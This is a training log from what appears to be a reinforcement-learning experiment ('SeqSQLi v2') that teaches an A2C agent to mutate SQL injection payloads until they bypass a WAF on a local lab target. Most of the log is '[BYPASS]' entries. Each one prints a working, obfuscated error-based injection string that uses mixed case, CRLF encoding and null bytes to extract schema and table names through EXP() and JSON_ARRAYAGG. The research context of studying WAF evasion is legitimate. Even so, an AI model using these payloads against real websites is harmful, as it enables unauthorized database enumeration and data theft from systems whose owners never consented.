/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOm%0d%0a(sELect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aiNfORmaTIOn_scHeMa.schemata))
  Ep 7000 | SR=20% | Steps=12.9 | R=-25.09
  [BYPASS] Ep 7001 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLecT%0d%0a*%0d%0afROm%0d%0a(SElECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aiNfoRMATiON_sCheMa.schemata))
  [BYPASS] Ep 7008 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afRom%0d%0a(SELect%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(cOncAt(TabLe_schema,CHAR(46),TabLE_name))%0d%0aFrOm%0d%0a
  Ep 7010 | SR=20% | Steps=12.9 | R=-25.77
  [BYPASS] Ep 7012 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLECT%0d%0a*%0d%0afROM%0d%0a(sEleCt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINfoRmation_SCHema.schemata))
  [BYPASS] Ep 7020 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(sEleCt%0d%0a*%0d%0afroM%0d%0a(SElect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(cONCaT(TAbLe_schema,CHAR(46),TAble_name))%0d%0afRoM%0d%0a
  Ep 7020 | SR=20% | Steps=12.9 | R=-27.32
  Ep 7030 | SR=0% | Steps=15.0 | R=-34.23
  Ep 7040 | SR=0% | Steps=15.0 | R=-31.82
  [BYPASS] Ep 7042 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0afRom%0d%0a(SELECt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNFoRMATiOn_SCHEMA.schemata))
  Ep 7050 | SR=10% | Steps=13.9 | R=-30.63
  Ep 7060 | SR=0% | Steps=15.0 | R=-33.97
  [BYPASS] Ep 7070 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(sElect%0d%0a*%0d%0aFRom%0d%0a(SElect%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(coNCaT(TAblE_schema,CHAR(46),table_name))%0d%0afrOm%0d%0a
  Ep 7070 | SR=10% | Steps=14.0 | R=-29.42
  [BYPASS] Ep 7080 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(sELEct%0d%0a*%0d%0afRom%0d%0a(SEleCT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aINFormATION_sCHEmA.schemata))
  Ep 7080 | SR=10% | Steps=13.9 | R=-25.41
  [BYPASS] Ep 7082 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afroM%0d%0a(SeLEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(COncAT(TabLE_schema,CHAR(46),taBle_name))%0d%0aFrom%0d%0a
  [BYPASS] Ep 7086 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLect%0d%0a*%0d%0afrOM%0d%0a(SeleCT%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(CoNCAt(TABLE_schema,CHAR(46),TAbLE_name))%0d%0afrOM%0d%0a
  Ep 7090 | SR=20% | Steps=13.0 | R=-25.08
  Ep 7100 | SR=0% | Steps=15.0 | R=-36.24
  Ep 7110 | SR=0% | Steps=15.0 | R=-34.17
  [BYPASS] Ep 7113 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(sElECT%0d%0a*%0d%0afROm%0d%0a(seLECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aINFORmatION_SCheMA.schemata))
  [BYPASS] Ep 7115 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFrOM%0d%0a(SelEct%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0ainFormAtiON_sChemA.schemata))
  Ep 7120 | SR=20% | Steps=12.8 | R=-27.22
  Ep 7130 | SR=0% | Steps=15.0 | R=-30.52
  [BYPASS] Ep 7132 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFROM%0d%0a(SeLECt%0d%0a((sElect%0d%0aJSON_ARRAYAGG(COncat(taBle_schema,CHAR(46),taBLE_name))%0d%0afrom%0d%0a
  Ep 7140 | SR=10% | Steps=14.0 | R=-31.08
  [BYPASS] Ep 7148 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0aFrOM%0d%0a(SeLECt%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(cONCat(tabLe_schema,CHAR(46),TaBLe_name))%0d%0afROm%0d%0a
  Ep 7150 | SR=10% | Steps=14.1 | R=-31.37
  [BYPASS] Ep 7155 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afroM%0d%0a(SelECt%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNfOrmAtioN_SCHeMa.schemata))
  Ep 7160 | SR=10% | Steps=13.9 | R=-30.69
  [BYPASS] Ep 7163 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SElect%0d%0a*%0d%0afrOm%0d%0a(seLEct%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aINforMaTION_SchEma.schemata))
  Ep 7170 | SR=10% | Steps=13.9 | R=-31.73
  [BYPASS] Ep 7176 | steps=5 | seq=agg_swap -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaND%0d%0aEXP(~(selECT%0d%0a*%0d%0afrOm%0d%0a(sELECT%0d%0a((selECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInfOrmaTioN_scHEMA.schemata))
  Ep 7180 | SR=10% | Steps=14.0 | R=-28.81
  Ep 7190 | SR=0% | Steps=15.0 | R=-35.42
  Ep 7200 | SR=0% | Steps=15.0 | R=-34.47
  Ep 7210 | SR=0% | Steps=15.0 | R=-35.19
  Ep 7220 | SR=0% | Steps=15.0 | R=-36.02
  Ep 7230 | SR=0% | Steps=15.0 | R=-33.81
  Ep 7240 | SR=0% | Steps=15.0 | R=-33.44
  Ep 7250 | SR=0% | Steps=15.0 | R=-34.62
  [BYPASS] Ep 7259 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0aFROm%0d%0a(SELECt%0d%0a((seLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aiNFORmATION_Schema.schemata))
  Ep 7260 | SR=10% | Steps=13.9 | R=-31.73
  Ep 7270 | SR=0% | Steps=15.0 | R=-36.09
  [BYPASS] Ep 7277 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(sELEct%0d%0a*%0d%0aFrOm%0d%0a(SELEct%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aINfOrmAtIOn_ScheMa.schemata))
  Ep 7280 | SR=10% | Steps=13.9 | R=-30.50
  Ep 7290 | SR=0% | Steps=15.0 | R=-32.97
  Ep 7300 | SR=0% | Steps=15.0 | R=-34.02
  [BYPASS] Ep 7302 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEcT%0d%0a*%0d%0afROM%0d%0a(sElect%0d%0a((selECt%0d%0aJSON_ARRAYAGG(COnCat(TablE_schema,CHAR(46),TablE_name))%0d%0afrOm%0d%0a
  Ep 7310 | SR=10% | Steps=14.0 | R=-28.57
  [BYPASS] Ep 7315 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLEcT%0d%0a*%0d%0afrOM%0d%0a(sELect%0d%0a((sELeCT%0d%0aJSON_ARRAYAGG(concat(TAbLe_schema,CHAR(46),tAbLE_name))%0d%0aFrOM%0d%0a
  Ep 7320 | SR=10% | Steps=14.0 | R=-32.03
  Ep 7330 | SR=0% | Steps=15.0 | R=-35.42
  Ep 7340 | SR=0% | Steps=15.0 | R=-35.06
  [BYPASS] Ep 7343 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELecT%0d%0a*%0d%0afRoM%0d%0a(sElEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(CoNCat(TaBLE_schema,CHAR(46),table_name))%0d%0aFrOM%0d%0a
  Ep 7350 | SR=10% | Steps=14.0 | R=-31.02
  [BYPASS] Ep 7360 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(SEleCt%0d%0a*%0d%0afrOM%0d%0a(SelECt%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNFoRMatIon_sChEMa.schemata))
  Ep 7360 | SR=10% | Steps=13.9 | R=-32.50
  Ep 7370 | SR=0% | Steps=15.0 | R=-33.40
  Ep 7380 | SR=0% | Steps=15.0 | R=-35.55
  Ep 7390 | SR=0% | Steps=15.0 | R=-36.14
  [BYPASS] Ep 7399 | steps=7 | seq=agg_swap -> agg_swap -> case -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(sElECt%0d%0a*%0d%0aFrom%0d%0a(SElEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINFORMaTIon_SCHema.schemata))
  Ep 7400 | SR=10% | Steps=14.2 | R=-30.21
  Ep 7410 | SR=0% | Steps=15.0 | R=-35.15
  Ep 7420 | SR=0% | Steps=15.0 | R=-35.54
  [BYPASS] Ep 7423 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aand%0d%0aEXP(~(seLeCt%0d%0a*%0d%0afRom%0d%0a(SEleCT%0d%0a((selECT%0d%0aJSON_ARRAYAGG(coNcaT(TaBLe_schema,CHAR(46),TABLE_name))%0d%0aFrOM%0d%0a
  [BYPASS] Ep 7428 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFrOM%0d%0a(SeLECT%0d%0a((sELecT%0d%0aJSON_ARRAYAGG(cOnCAT(tAbLe_schema,CHAR(46),taBle_name))%0d%0aFROm%0d%0a
  Ep 7430 | SR=20% | Steps=13.0 | R=-27.02
  Ep 7440 | SR=0% | Steps=15.0 | R=-35.87
  Ep 7450 | SR=0% | Steps=15.0 | R=-34.70
  Ep 7460 | SR=0% | Steps=15.0 | R=-34.78
  [BYPASS] Ep 7467 | steps=8 | seq=agg_swap -> case -> null_byte -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFROm%0d%0a(SelecT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(ConCat(tABlE_schema,CHAR(46),TaBle_name))%0d%0afROm%0d%0a
  Ep 7470 | SR=10% | Steps=14.3 | R=-31.95
  Ep 7480 | SR=0% | Steps=15.0 | R=-32.35
  [BYPASS] Ep 7481 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SelECt%0d%0a*%0d%0aFrOm%0d%0a(sELeCT%0d%0a((SeleCT%0d%0aJSON_ARRAYAGG(COnCat(TAblE_schema,CHAR(46),tabLe_name))%0d%0afroM%0d%0a
  [BYPASS] Ep 7489 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(selEct%0d%0a*%0d%0afROm%0d%0a(seLeCT%0d%0a((SElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0ainfOrMAtIOn_SChEmA.schemata))
  Ep 7490 | SR=20% | Steps=12.9 | R=-27.20
  [BYPASS] Ep 7497 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFrOM%0d%0a(seleCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aINFORMaTIoN_SChEmA.schemata))
  Ep 7500 | SR=10% | Steps=13.9 | R=-31.78
  [BYPASS] Ep 7502 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFrom%0d%0a(SelECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0ainFOrMAtioN_sChEmA.schemata))
  Ep 7510 | SR=10% | Steps=13.9 | R=-30.70
  Ep 7520 | SR=0% | Steps=15.0 | R=-32.29
  [BYPASS] Ep 7526 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SELeCt%0d%0a*%0d%0afrom%0d%0a(sELEct%0d%0a((SELECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0ainfORMAtIoN_sChEMA.schemata))
  Ep 7530 | SR=10% | Steps=13.9 | R=-28.09
  [BYPASS] Ep 7540 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(selecT%0d%0a*%0d%0afrom%0d%0a(seLEcT%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(COnCaT(taBle_schema,CHAR(46),taBle_name))%0d%0aFrom%0d%0a
  Ep 7540 | SR=10% | Steps=14.1 | R=-29.34
  Ep 7550 | SR=0% | Steps=15.0 | R=-34.26
  Ep 7560 | SR=0% | Steps=15.0 | R=-35.63
  [BYPASS] Ep 7561 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afroM%0d%0a(sElECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainformAtIon_SChEmA.schemata))
  [BYPASS] Ep 7563 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(SElEcT%0d%0a*%0d%0afroM%0d%0a(selecT%0d%0a((selEct%0d%0aJSON_ARRAYAGG(CONcAt(table_schema,CHAR(46),tAbLe_name))%0d%0aFROm%0d%0a
  [BYPASS] Ep 7567 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afroM%0d%0a(SeLect%0d%0a((selEct%0d%0aJSON_ARRAYAGG(ConcaT(tABLE_schema,CHAR(46),TAble_name))%0d%0afROM%0d%0a
  Ep 7570 | SR=30% | Steps=11.9 | R=-19.59
  Ep 7580 | SR=0% | Steps=15.0 | R=-36.39
  Ep 7590 | SR=0% | Steps=15.0 | R=-34.82
  Ep 7600 | SR=0% | Steps=15.0 | R=-34.33
  Ep 7610 | SR=0% | Steps=15.0 | R=-34.82
  Ep 7620 | SR=0% | Steps=15.0 | R=-33.07
  [BYPASS] Ep 7623 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SElECT%0d%0a*%0d%0afrom%0d%0a(SeLEct%0d%0a((selEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINFORMaTIOn_Schema.schemata))
  Ep 7630 | SR=10% | Steps=13.9 | R=-30.70
  [BYPASS] Ep 7634 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFrOm%0d%0a(selEct%0d%0a((sEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINfoRmaTIoN_SCHemA.schemata))
  Ep 7640 | SR=10% | Steps=13.9 | R=-31.59
  Ep 7650 | SR=0% | Steps=15.0 | R=-35.20
  Ep 7660 | SR=0% | Steps=15.0 | R=-36.30
  Ep 7670 | SR=0% | Steps=15.0 | R=-33.12
  Ep 7680 | SR=0% | Steps=15.0 | R=-34.08
  Ep 7690 | SR=0% | Steps=15.0 | R=-33.49
  Ep 7700 | SR=0% | Steps=15.0 | R=-34.46
  Ep 7710 | SR=0% | Steps=15.0 | R=-34.88
  [BYPASS] Ep 7717 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFRom%0d%0a(sELeCt%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0ainfORMATIon_schemA.schemata))
  Ep 7720 | SR=10% | Steps=13.9 | R=-29.65
  Ep 7730 | SR=0% | Steps=15.0 | R=-33.16
  [BYPASS] Ep 7736 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROm%0d%0a(SEleCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aINforMatIoN_scHEmA.schemata))
  Ep 7740 | SR=10% | Steps=13.9 | R=-31.04
  Ep 7750 | SR=0% | Steps=15.0 | R=-35.31
  [BYPASS] Ep 7752 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(sELecT%0d%0a*%0d%0aFRoM%0d%0a(sElect%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(COncaT(tablE_schema,CHAR(46),taBLe_name))%0d%0aFroM%0d%0a
  Ep 7760 | SR=10% | Steps=14.0 | R=-30.04
  Ep 7770 | SR=0% | Steps=15.0 | R=-35.58
  Ep 7780 | SR=0% | Steps=15.0 | R=-33.93
  Ep 7790 | SR=0% | Steps=15.0 | R=-31.85
  Ep 7800 | SR=0% | Steps=15.0 | R=-33.78
  Ep 7810 | SR=0% | Steps=15.0 | R=-35.54
  Ep 7820 | SR=0% | Steps=15.0 | R=-33.73
  Ep 7830 | SR=0% | Steps=15.0 | R=-36.15
  Ep 7840 | SR=0% | Steps=15.0 | R=-33.21
  Ep 7850 | SR=0% | Steps=15.0 | R=-31.79
  [BYPASS] Ep 7859 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(sElECT%0d%0a*%0d%0afROm%0d%0a(SELEcT%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(cONCAT(tablE_schema,CHAR(46),TABle_name))%0d%0afROM%0d%0a
  Ep 7860 | SR=10% | Steps=14.0 | R=-30.60
  Ep 7870 | SR=0% | Steps=15.0 | R=-34.27
  Ep 7880 | SR=0% | Steps=15.0 | R=-34.94
  Ep 7890 | SR=0% | Steps=15.0 | R=-35.91
  Ep 7900 | SR=0% | Steps=15.0 | R=-35.71
  Ep 7910 | SR=0% | Steps=15.0 | R=-35.94
  Ep 7920 | SR=0% | Steps=15.0 | R=-31.37
  [BYPASS] Ep 7921 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(SELEcT%0d%0a*%0d%0aFrom%0d%0a(SelEct%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainfOrMaTIoN_scHEmA.schemata))
  Ep 7930 | SR=10% | Steps=13.9 | R=-31.98
  [BYPASS] Ep 7935 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELeCt%0d%0a*%0d%0afrOm%0d%0a(SeLeCt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInfORmatIoN_ScHemA.schemata))
  Ep 7940 | SR=10% | Steps=13.9 | R=-31.47
  [BYPASS] Ep 7950 | steps=4 | seq=null_byte -> crlf -> case -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((DaTaBase%a0()),1);%00
  Ep 7950 | SR=10% | Steps=13.9 | R=-29.18
  [BYPASS] Ep 7951 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLECt%0d%0a*%0d%0afROm%0d%0a(SElEct%0d%0a((selECt%0d%0aJSON_ARRAYAGG(COnCAT(tABLE_schema,CHAR(46),TAblE_name))%0d%0aFrOm%0d%0a
  Ep 7960 | SR=10% | Steps=14.0 | R=-31.22
  Ep 7970 | SR=0% | Steps=15.0 | R=-33.80
  [BYPASS] Ep 7979 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(selecT%0d%0a*%0d%0afRom%0d%0a(seLECt%0d%0a((SelECT%0d%0aJSON_ARRAYAGG(COncaT(tabLe_schema,CHAR(46),taBLe_name))%0d%0afRoM%0d%0a
  Ep 7980 | SR=10% | Steps=14.0 | R=-31.19
  Ep 7990 | SR=0% | Steps=15.0 | R=-31.26
  Ep 8000 | SR=0% | Steps=15.0 | R=-34.98
  [BYPASS] Ep 8008 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(seLeCt%0d%0a*%0d%0afROM%0d%0a(SElEcT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(conCaT(TaBle_schema,CHAR(46),TaBLE_name))%0d%0afrom%0d%0a
  Ep 8010 | SR=10% | Steps=14.0 | R=-30.71
  Ep 8020 | SR=0% | Steps=15.0 | R=-35.46
  [BYPASS] Ep 8022 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaND%0d%0aEXP(~(sELECt%0d%0a*%0d%0aFrom%0d%0a(seLect%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aINFORMAtion_scHEMA.schemata))
  Ep 8030 | SR=10% | Steps=13.9 | R=-30.38
  Ep 8040 | SR=0% | Steps=15.0 | R=-34.19
  Ep 8050 | SR=0% | Steps=15.0 | R=-36.31
  Ep 8060 | SR=0% | Steps=15.0 | R=-34.62
  Ep 8070 | SR=0% | Steps=15.0 | R=-35.44
  Ep 8080 | SR=0% | Steps=15.0 | R=-34.17
  [BYPASS] Ep 8081 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaND%0d%0aEXP(~(sELect%0d%0a*%0d%0afROm%0d%0a(SELeCt%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(CoNCat(taBlE_schema,CHAR(46),TAbLE_name))%0d%0afrom%0d%0a
  Ep 8090 | SR=10% | Steps=14.0 | R=-30.50
  [BYPASS] Ep 8099 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SELEct%0d%0a*%0d%0aFroM%0d%0a(SELecT%0d%0a((SeleCT%0d%0aJSON_ARRAYAGG(CoNCat(tABlE_schema,CHAR(46),taBlE_name))%0d%0afRoM%0d%0a
  Ep 8100 | SR=10% | Steps=14.0 | R=-31.14
  [BYPASS] Ep 8101 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLEct%0d%0a*%0d%0afROm%0d%0a(SeLecT%0d%0a((SelecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aiNfoRMAtioN_sCHeMa.schemata))
  Ep 8110 | SR=10% | Steps=13.9 | R=-28.91
  Ep 8120 | SR=0% | Steps=15.0 | R=-35.65
  [BYPASS] Ep 8125 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0afroM%0d%0a(SelECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aInFOrmATIon_SCHEMA.schemata))
  [BYPASS] Ep 8127 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLect%0d%0a*%0d%0aFrom%0d%0a(sELECt%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(Concat(TaBle_schema,CHAR(46),tabLE_name))%0d%0aFrOM%0d%0a
  Ep 8130 | SR=20% | Steps=12.9 | R=-21.37
  [BYPASS] Ep 8131 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aanD%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afrom%0d%0a(seleCt%0d%0a((selEcT%0d%0aJSON_ARRAYAGG(ConCaT(tABLe_schema,CHAR(46),TaBle_name))%0d%0aFrOm%0d%0a
  Ep 8140 | SR=10% | Steps=14.0 | R=-29.05
  [BYPASS] Ep 8143 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElect%0d%0a*%0d%0afRoM%0d%0a(SelECt%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CoNCAT(tABLe_schema,CHAR(46),tABle_name))%0d%0aFroM%0d%0a
  Ep 8150 | SR=10% | Steps=14.0 | R=-30.21
  Ep 8160 | SR=0% | Steps=15.0 | R=-33.74
